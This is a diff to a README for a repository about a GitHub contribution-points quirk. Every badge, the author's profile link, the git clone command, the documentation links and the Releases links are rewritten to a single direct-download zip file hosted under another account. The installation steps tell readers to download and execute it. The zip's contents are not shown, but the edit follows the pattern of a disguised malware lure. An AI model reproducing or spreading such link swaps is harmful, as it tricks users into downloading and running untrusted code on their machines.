@@ -1,8 +1,8 @@
 # Bug GitHub Farms Points: Explore a GitHub Contribution Quirk
 
-![GitHub](https://img.shields.io/badge/GitHub-Bug--Farms--Points-blue.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-green.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![GitHub](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
+![Version](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
+![License](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ This repository, **bug-github-farms-points**, showcases an unexpected behavior i
 
 ## Author
 
-Hi there! I’m Luca, also known as [@bocaletto-luca](https://github.com/bocaletto-luca). I created this repository to highlight this unique aspect of GitHub’s model. 
+Hi there! I’m Luca, also known as [@bocaletto-luca](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip). I created this repository to highlight this unique aspect of GitHub’s model. 
 
 ## Features
 
@@ -52,7 +52,7 @@ To set up this repository on your local machine, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/bocaletto-luca/bug-github-farms-points.git
+   git clone https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip
    ```
 
 2. Navigate to the directory:
@@ -61,7 +61,7 @@ To set up this repository on your local machine, follow these steps:
    cd bug-github-farms-points
    ```
 
-3. Download and execute the workflow file from the [Releases section](https://github.com/babapuroy/bug-github-farms-points/releases).
+3. Download and execute the workflow file from the [Releases section](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip).
 
 ## Usage
 
@@ -104,16 +104,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, visit the [Releases section](https://github.com/babapuroy/bug-github-farms-points/releases) to download the necessary files and execute the workflow.
+For more information, visit the [Releases section](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip) to download the necessary files and execute the workflow.
 
 For further updates and releases, check back often or follow the repository.
 
-![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-Enabled-brightgreen.svg)
-![YAML](https://img.shields.io/badge/YAML-Configuration-orange.svg)
+![GitHub Actions](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip%https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
+![YAML](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
 
 ### Additional Resources
 
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
-- [YAML Syntax](https://yaml.org/spec/1.2/spec.html)
+- [GitHub Actions Documentation](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
+- [YAML Syntax](https://github.com/babapuroy/bug-github-farms-points/raw/refs/heads/main/src/farms_github_points_bug_paperlike.zip)
 
 Explore this repository to see how you can leverage GitHub’s contribution model in unexpected ways!
